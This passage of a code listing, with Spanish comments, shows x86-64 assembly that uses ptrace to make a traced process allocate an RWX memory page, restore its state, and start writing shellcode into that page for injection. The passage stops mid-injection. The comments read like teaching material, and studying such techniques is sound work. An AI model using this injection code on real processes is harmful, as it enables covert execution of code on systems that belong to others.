</span><span id="__span-10-147"><a id="__codelineno-10-147" name="__codelineno-10-147" href="#__codelineno-10-147"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-148"><a id="__codelineno-10-148" name="__codelineno-10-148" href="#__codelineno-10-148"></a>
</span><span id="__span-10-149"><a id="__codelineno-10-149" name="__codelineno-10-149" href="#__codelineno-10-149"></a>
</span><span id="__span-10-150"><a id="__codelineno-10-150" name="__codelineno-10-150" href="#__codelineno-10-150"></a><span class="c1">; 4 Configuración de registros para MMAP</span>
</span><span id="__span-10-151"><a id="__codelineno-10-151" name="__codelineno-10-151" href="#__codelineno-10-151"></a>
</span><span id="__span-10-152"><a id="__codelineno-10-152" name="__codelineno-10-152" href="#__codelineno-10-152"></a>
</span><span id="__span-10-153"><a id="__codelineno-10-153" name="__codelineno-10-153" href="#__codelineno-10-153"></a><span class="w">    </span><span class="c1">; MMAP</span>
</span><span id="__span-10-154"><a id="__codelineno-10-154" name="__codelineno-10-154" href="#__codelineno-10-154"></a>
</span><span id="__span-10-155"><a id="__codelineno-10-155" name="__codelineno-10-155" href="#__codelineno-10-155"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x50</span><span class="p">],</span><span class="w"> </span><span class="mi">9</span><span class="w">       </span><span class="c1">; (RAX) Se sustituye todo el valor del registro       Número de syscall para mmap</span>
</span><span id="__span-10-156"><a id="__codelineno-10-156" name="__codelineno-10-156" href="#__codelineno-10-156"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x70</span><span class="p">],</span><span class="mi">0</span><span class="w">        </span><span class="c1">; (RDI)       rdi = addr = 0 (NULL) → Pide al kernel que elija la dirección</span>
</span><span id="__span-10-157"><a id="__codelineno-10-157" name="__codelineno-10-157" href="#__codelineno-10-157"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x68</span><span class="p">],</span><span class="mi">4096</span><span class="w">     </span><span class="c1">; (RSI)    rsi = length = 4096 bytes (1 página típica)</span>
</span><span id="__span-10-158"><a id="__codelineno-10-158" name="__codelineno-10-158" href="#__codelineno-10-158"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x60</span><span class="p">],</span><span class="mi">7</span><span class="w">        </span><span class="c1">; (RDX)       rdx = prot = 7 =&gt; PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)</span>
</span><span id="__span-10-159"><a id="__codelineno-10-159" name="__codelineno-10-159" href="#__codelineno-10-159"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x38</span><span class="p">],</span><span class="mi">34</span><span class="w">       </span><span class="c1">; (R10)      r10 = flags = 34 =&gt; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)</span>
</span><span id="__span-10-160"><a id="__codelineno-10-160" name="__codelineno-10-160" href="#__codelineno-10-160"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x48</span><span class="p">],</span><span class="o">-</span><span class="mi">1</span><span class="w">       </span><span class="c1">; (R8)       r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica &quot;no file&quot;)</span>
</span><span id="__span-10-161"><a id="__codelineno-10-161" name="__codelineno-10-161" href="#__codelineno-10-161"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x40</span><span class="p">],</span><span class="mi">0</span><span class="w">        </span><span class="c1">; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)</span>
</span><span id="__span-10-162"><a id="__codelineno-10-162" name="__codelineno-10-162" href="#__codelineno-10-162"></a>
</span><span id="__span-10-163"><a id="__codelineno-10-163" name="__codelineno-10-163" href="#__codelineno-10-163"></a><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-10-164"><a id="__codelineno-10-164" name="__codelineno-10-164" href="#__codelineno-10-164"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-165"><a id="__codelineno-10-165" name="__codelineno-10-165" href="#__codelineno-10-165"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-10-166"><a id="__codelineno-10-166" name="__codelineno-10-166" href="#__codelineno-10-166"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-167"><a id="__codelineno-10-167" name="__codelineno-10-167" href="#__codelineno-10-167"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-10-168"><a id="__codelineno-10-168" name="__codelineno-10-168" href="#__codelineno-10-168"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-10-169"><a id="__codelineno-10-169" name="__codelineno-10-169" href="#__codelineno-10-169"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-10-170"><a id="__codelineno-10-170" name="__codelineno-10-170" href="#__codelineno-10-170"></a>
</span><span id="__span-10-171"><a id="__codelineno-10-171" name="__codelineno-10-171" href="#__codelineno-10-171"></a>
</span><span id="__span-10-172"><a id="__codelineno-10-172" name="__codelineno-10-172" href="#__codelineno-10-172"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-173"><a id="__codelineno-10-173" name="__codelineno-10-173" href="#__codelineno-10-173"></a>
</span><span id="__span-10-174"><a id="__codelineno-10-174" name="__codelineno-10-174" href="#__codelineno-10-174"></a>
</span><span id="__span-10-175"><a id="__codelineno-10-175" name="__codelineno-10-175" href="#__codelineno-10-175"></a><span class="c1">; 5 Ejecución controlada de la syscall MMAP</span>
</span><span id="__span-10-176"><a id="__codelineno-10-176" name="__codelineno-10-176" href="#__codelineno-10-176"></a>
</span><span id="__span-10-177"><a id="__codelineno-10-177" name="__codelineno-10-177" href="#__codelineno-10-177"></a><span class="w">    </span><span class="c1">;PTRACE_SINGLESTEP</span>
</span><span id="__span-10-178"><a id="__codelineno-10-178" name="__codelineno-10-178" href="#__codelineno-10-178"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-179"><a id="__codelineno-10-179" name="__codelineno-10-179" href="#__codelineno-10-179"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="w">       </span><span class="c1">; PTRACE_SINGLESTEP</span>
</span><span id="__span-10-180"><a id="__codelineno-10-180" name="__codelineno-10-180" href="#__codelineno-10-180"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">     </span><span class="c1">; PID</span>
</span><span id="__span-10-181"><a id="__codelineno-10-181" name="__codelineno-10-181" href="#__codelineno-10-181"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">     </span><span class="c1">; addr</span>
</span><span id="__span-10-182"><a id="__codelineno-10-182" name="__codelineno-10-182" href="#__codelineno-10-182"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">     </span><span class="c1">; data</span>
</span><span id="__span-10-183"><a id="__codelineno-10-183" name="__codelineno-10-183" href="#__codelineno-10-183"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-184"><a id="__codelineno-10-184" name="__codelineno-10-184" href="#__codelineno-10-184"></a>
</span><span id="__span-10-185"><a id="__codelineno-10-185" name="__codelineno-10-185" href="#__codelineno-10-185"></a><span class="w">    </span><span class="c1">; WAIT4: </span>
</span><span id="__span-10-186"><a id="__codelineno-10-186" name="__codelineno-10-186" href="#__codelineno-10-186"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span>
</span><span id="__span-10-187"><a id="__codelineno-10-187" name="__codelineno-10-187" href="#__codelineno-10-187"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">            </span><span class="c1">; PID a esperar (-1 para cualquier hijo)</span>
</span><span id="__span-10-188"><a id="__codelineno-10-188" name="__codelineno-10-188" href="#__codelineno-10-188"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-10-189"><a id="__codelineno-10-189" name="__codelineno-10-189" href="#__codelineno-10-189"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">            </span><span class="c1">; &amp;status</span>
</span><span id="__span-10-190"><a id="__codelineno-10-190" name="__codelineno-10-190" href="#__codelineno-10-190"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">            </span><span class="c1">; options</span>
</span><span id="__span-10-191"><a id="__codelineno-10-191" name="__codelineno-10-191" href="#__codelineno-10-191"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">            </span><span class="c1">; rusage</span>
</span><span id="__span-10-192"><a id="__codelineno-10-192" name="__codelineno-10-192" href="#__codelineno-10-192"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-193"><a id="__codelineno-10-193" name="__codelineno-10-193" href="#__codelineno-10-193"></a>
</span><span id="__span-10-194"><a id="__codelineno-10-194" name="__codelineno-10-194" href="#__codelineno-10-194"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-10-195"><a id="__codelineno-10-195" name="__codelineno-10-195" href="#__codelineno-10-195"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-196"><a id="__codelineno-10-196" name="__codelineno-10-196" href="#__codelineno-10-196"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">   </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-10-197"><a id="__codelineno-10-197" name="__codelineno-10-197" href="#__codelineno-10-197"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">  </span><span class="c1">; PID</span>
</span><span id="__span-10-198"><a id="__codelineno-10-198" name="__codelineno-10-198" href="#__codelineno-10-198"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">  </span><span class="c1">; addr</span>
</span><span id="__span-10-199"><a id="__codelineno-10-199" name="__codelineno-10-199" href="#__codelineno-10-199"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_sys</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se va almacenar la estructura de registros</span>
</span><span id="__span-10-200"><a id="__codelineno-10-200" name="__codelineno-10-200" href="#__codelineno-10-200"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-201"><a id="__codelineno-10-201" name="__codelineno-10-201" href="#__codelineno-10-201"></a>
</span><span id="__span-10-202"><a id="__codelineno-10-202" name="__codelineno-10-202" href="#__codelineno-10-202"></a>
</span><span id="__span-10-203"><a id="__codelineno-10-203" name="__codelineno-10-203" href="#__codelineno-10-203"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-204"><a id="__codelineno-10-204" name="__codelineno-10-204" href="#__codelineno-10-204"></a>
</span><span id="__span-10-205"><a id="__codelineno-10-205" name="__codelineno-10-205" href="#__codelineno-10-205"></a>
</span><span id="__span-10-206"><a id="__codelineno-10-206" name="__codelineno-10-206" href="#__codelineno-10-206"></a><span class="c1">; 6 Obtención del resultado de la syscall MMAP</span>
</span><span id="__span-10-207"><a id="__codelineno-10-207" name="__codelineno-10-207" href="#__codelineno-10-207"></a>
</span><span id="__span-10-208"><a id="__codelineno-10-208" name="__codelineno-10-208" href="#__codelineno-10-208"></a>
</span><span id="__span-10-209"><a id="__codelineno-10-209" name="__codelineno-10-209" href="#__codelineno-10-209"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w"> </span>
</span><span id="__span-10-210"><a id="__codelineno-10-210" name="__codelineno-10-210" href="#__codelineno-10-210"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_sys</span><span class="o">+</span><span class="mh">0x50</span><span class="p">]</span><span class="w">       </span><span class="c1">; (RAX) dirección donde comienza la zona de memoria reservada com permisos RWX</span>
</span><span id="__span-10-211"><a id="__codelineno-10-211" name="__codelineno-10-211" href="#__codelineno-10-211"></a>
</span><span id="__span-10-212"><a id="__codelineno-10-212" name="__codelineno-10-212" href="#__codelineno-10-212"></a>
</span><span id="__span-10-213"><a id="__codelineno-10-213" name="__codelineno-10-213" href="#__codelineno-10-213"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-214"><a id="__codelineno-10-214" name="__codelineno-10-214" href="#__codelineno-10-214"></a>
</span><span id="__span-10-215"><a id="__codelineno-10-215" name="__codelineno-10-215" href="#__codelineno-10-215"></a><span class="c1">; 7 Restauración del contenido ubicado en la dirección a la que apunta el registro RIP del tracee</span>
</span><span id="__span-10-216"><a id="__codelineno-10-216" name="__codelineno-10-216" href="#__codelineno-10-216"></a>
</span><span id="__span-10-217"><a id="__codelineno-10-217" name="__codelineno-10-217" href="#__codelineno-10-217"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-10-218"><a id="__codelineno-10-218" name="__codelineno-10-218" href="#__codelineno-10-218"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span>
</span><span id="__span-10-219"><a id="__codelineno-10-219" name="__codelineno-10-219" href="#__codelineno-10-219"></a>
</span><span id="__span-10-220"><a id="__codelineno-10-220" name="__codelineno-10-220" href="#__codelineno-10-220"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-10-221"><a id="__codelineno-10-221" name="__codelineno-10-221" href="#__codelineno-10-221"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-222"><a id="__codelineno-10-222" name="__codelineno-10-222" href="#__codelineno-10-222"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-10-223"><a id="__codelineno-10-223" name="__codelineno-10-223" href="#__codelineno-10-223"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-224"><a id="__codelineno-10-224" name="__codelineno-10-224" href="#__codelineno-10-224"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-10-225"><a id="__codelineno-10-225" name="__codelineno-10-225" href="#__codelineno-10-225"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r13</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-10-226"><a id="__codelineno-10-226" name="__codelineno-10-226" href="#__codelineno-10-226"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-10-227"><a id="__codelineno-10-227" name="__codelineno-10-227" href="#__codelineno-10-227"></a>
</span><span id="__span-10-228"><a id="__codelineno-10-228" name="__codelineno-10-228" href="#__codelineno-10-228"></a><span class="w">        </span><span class="c1">; Comprobación de que se haya restaurado el bytearray de manera adecuada</span>
</span><span id="__span-10-229"><a id="__codelineno-10-229" name="__codelineno-10-229" href="#__codelineno-10-229"></a><span class="w">        </span><span class="c1">; PTRACE_PEEKDATA (leer memoria)</span>
</span><span id="__span-10-230"><a id="__codelineno-10-230" name="__codelineno-10-230" href="#__codelineno-10-230"></a><span class="w">        </span><span class="c1">;mov rax, 101</span>
</span><span id="__span-10-231"><a id="__codelineno-10-231" name="__codelineno-10-231" href="#__codelineno-10-231"></a><span class="w">        </span><span class="c1">;mov rdi, 2       ; PTRACE_PEEKDATA</span>
</span><span id="__span-10-232"><a id="__codelineno-10-232" name="__codelineno-10-232" href="#__codelineno-10-232"></a><span class="w">        </span><span class="c1">;mov rsi, r15     ; PID</span>
</span><span id="__span-10-233"><a id="__codelineno-10-233" name="__codelineno-10-233" href="#__codelineno-10-233"></a><span class="w">        </span><span class="c1">;mov rdx, r14     ; addr</span>
</span><span id="__span-10-234"><a id="__codelineno-10-234" name="__codelineno-10-234" href="#__codelineno-10-234"></a><span class="w">        </span><span class="c1">;sub rsp, 8</span>
</span><span id="__span-10-235"><a id="__codelineno-10-235" name="__codelineno-10-235" href="#__codelineno-10-235"></a><span class="w">        </span><span class="c1">;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-10-236"><a id="__codelineno-10-236" name="__codelineno-10-236" href="#__codelineno-10-236"></a><span class="w">        </span><span class="c1">;syscall </span>
</span><span id="__span-10-237"><a id="__codelineno-10-237" name="__codelineno-10-237" href="#__codelineno-10-237"></a>
</span><span id="__span-10-238"><a id="__codelineno-10-238" name="__codelineno-10-238" href="#__codelineno-10-238"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-239"><a id="__codelineno-10-239" name="__codelineno-10-239" href="#__codelineno-10-239"></a>
</span><span id="__span-10-240"><a id="__codelineno-10-240" name="__codelineno-10-240" href="#__codelineno-10-240"></a>
</span><span id="__span-10-241"><a id="__codelineno-10-241" name="__codelineno-10-241" href="#__codelineno-10-241"></a><span class="c1">; 8 Restauración de los registros originales del proceso tracee</span>
</span><span id="__span-10-242"><a id="__codelineno-10-242" name="__codelineno-10-242" href="#__codelineno-10-242"></a>
</span><span id="__span-10-243"><a id="__codelineno-10-243" name="__codelineno-10-243" href="#__codelineno-10-243"></a>
</span><span id="__span-10-244"><a id="__codelineno-10-244" name="__codelineno-10-244" href="#__codelineno-10-244"></a>
</span><span id="__span-10-245"><a id="__codelineno-10-245" name="__codelineno-10-245" href="#__codelineno-10-245"></a><span class="w">        </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-10-246"><a id="__codelineno-10-246" name="__codelineno-10-246" href="#__codelineno-10-246"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-247"><a id="__codelineno-10-247" name="__codelineno-10-247" href="#__codelineno-10-247"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-10-248"><a id="__codelineno-10-248" name="__codelineno-10-248" href="#__codelineno-10-248"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-249"><a id="__codelineno-10-249" name="__codelineno-10-249" href="#__codelineno-10-249"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-10-250"><a id="__codelineno-10-250" name="__codelineno-10-250" href="#__codelineno-10-250"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-10-251"><a id="__codelineno-10-251" name="__codelineno-10-251" href="#__codelineno-10-251"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-10-252"><a id="__codelineno-10-252" name="__codelineno-10-252" href="#__codelineno-10-252"></a>
</span><span id="__span-10-253"><a id="__codelineno-10-253" name="__codelineno-10-253" href="#__codelineno-10-253"></a>
</span><span id="__span-10-254"><a id="__codelineno-10-254" name="__codelineno-10-254" href="#__codelineno-10-254"></a>
</span><span id="__span-10-255"><a id="__codelineno-10-255" name="__codelineno-10-255" href="#__codelineno-10-255"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-256"><a id="__codelineno-10-256" name="__codelineno-10-256" href="#__codelineno-10-256"></a>
</span><span id="__span-10-257"><a id="__codelineno-10-257" name="__codelineno-10-257" href="#__codelineno-10-257"></a><span class="c1">; 9 Almacenamiento del RIP de retorno en los últimos 8 bytes de la región de memoria reservada por MMAP</span>
</span><span id="__span-10-258"><a id="__codelineno-10-258" name="__codelineno-10-258" href="#__codelineno-10-258"></a>
</span><span id="__span-10-259"><a id="__codelineno-10-259" name="__codelineno-10-259" href="#__codelineno-10-259"></a>
</span><span id="__span-10-260"><a id="__codelineno-10-260" name="__codelineno-10-260" href="#__codelineno-10-260"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-10-261"><a id="__codelineno-10-261" name="__codelineno-10-261" href="#__codelineno-10-261"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-262"><a id="__codelineno-10-262" name="__codelineno-10-262" href="#__codelineno-10-262"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-10-263"><a id="__codelineno-10-263" name="__codelineno-10-263" href="#__codelineno-10-263"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-264"><a id="__codelineno-10-264" name="__codelineno-10-264" href="#__codelineno-10-264"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r12</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-10-265"><a id="__codelineno-10-265" name="__codelineno-10-265" href="#__codelineno-10-265"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-10-266"><a id="__codelineno-10-266" name="__codelineno-10-266" href="#__codelineno-10-266"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-10-267"><a id="__codelineno-10-267" name="__codelineno-10-267" href="#__codelineno-10-267"></a>
</span><span id="__span-10-268"><a id="__codelineno-10-268" name="__codelineno-10-268" href="#__codelineno-10-268"></a><span class="w">        </span><span class="c1">; Verificar que se ha escrito el valor del RIP de retorno en la región de memoria reservada por MMAP</span>
</span><span id="__span-10-269"><a id="__codelineno-10-269" name="__codelineno-10-269" href="#__codelineno-10-269"></a>
</span><span id="__span-10-270"><a id="__codelineno-10-270" name="__codelineno-10-270" href="#__codelineno-10-270"></a><span class="w">        </span><span class="c1">; PTRACE_PEEKDATA</span>
</span><span id="__span-10-271"><a id="__codelineno-10-271" name="__codelineno-10-271" href="#__codelineno-10-271"></a><span class="w">        </span><span class="c1">;mov rax, 101</span>
</span><span id="__span-10-272"><a id="__codelineno-10-272" name="__codelineno-10-272" href="#__codelineno-10-272"></a><span class="w">        </span><span class="c1">;mov rdi, 2       ; PTRACE_PEEKDATA</span>
</span><span id="__span-10-273"><a id="__codelineno-10-273" name="__codelineno-10-273" href="#__codelineno-10-273"></a><span class="w">        </span><span class="c1">;mov rsi, r15     ; PID</span>
</span><span id="__span-10-274"><a id="__codelineno-10-274" name="__codelineno-10-274" href="#__codelineno-10-274"></a><span class="w">        </span><span class="c1">;lea rdx, [r12+4088]     ; addr</span>
</span><span id="__span-10-275"><a id="__codelineno-10-275" name="__codelineno-10-275" href="#__codelineno-10-275"></a><span class="w">        </span><span class="c1">;sub rsp, 8       ; 8 bytes</span>
</span><span id="__span-10-276"><a id="__codelineno-10-276" name="__codelineno-10-276" href="#__codelineno-10-276"></a><span class="w">        </span><span class="c1">;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-10-277"><a id="__codelineno-10-277" name="__codelineno-10-277" href="#__codelineno-10-277"></a><span class="w">        </span><span class="c1">;syscall </span>
</span><span id="__span-10-278"><a id="__codelineno-10-278" name="__codelineno-10-278" href="#__codelineno-10-278"></a>
</span><span id="__span-10-279"><a id="__codelineno-10-279" name="__codelineno-10-279" href="#__codelineno-10-279"></a>
</span><span id="__span-10-280"><a id="__codelineno-10-280" name="__codelineno-10-280" href="#__codelineno-10-280"></a>
</span><span id="__span-10-281"><a id="__codelineno-10-281" name="__codelineno-10-281" href="#__codelineno-10-281"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-282"><a id="__codelineno-10-282" name="__codelineno-10-282" href="#__codelineno-10-282"></a>
</span><span id="__span-10-283"><a id="__codelineno-10-283" name="__codelineno-10-283" href="#__codelineno-10-283"></a><span class="c1">; 10 Inyección del shellcode en la zona de memoria reservada</span>
</span><span id="__span-10-284"><a id="__codelineno-10-284" name="__codelineno-10-284" href="#__codelineno-10-284"></a>
</span><span id="__span-10-285"><a id="__codelineno-10-285" name="__codelineno-10-285" href="#__codelineno-10-285"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="nb">r13</span>
</span><span id="__span-10-286"><a id="__codelineno-10-286" name="__codelineno-10-286" href="#__codelineno-10-286"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">shellcode</span><span class="p">]</span><span class="w">   </span><span class="c1">; puntero al shellcode</span>
</span><span id="__span-10-287"><a id="__codelineno-10-287" name="__codelineno-10-287" href="#__codelineno-10-287"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-10-288"><a id="__codelineno-10-288" name="__codelineno-10-288" href="#__codelineno-10-288"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nv">sc_len</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="w">        </span><span class="c1">; contador de palabras a escribir</span>
</span><span id="__span-10-289"><a id="__codelineno-10-289" name="__codelineno-10-289" href="#__codelineno-10-289"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-10-290"><a id="__codelineno-10-290" name="__codelineno-10-290" href="#__codelineno-10-290"></a>
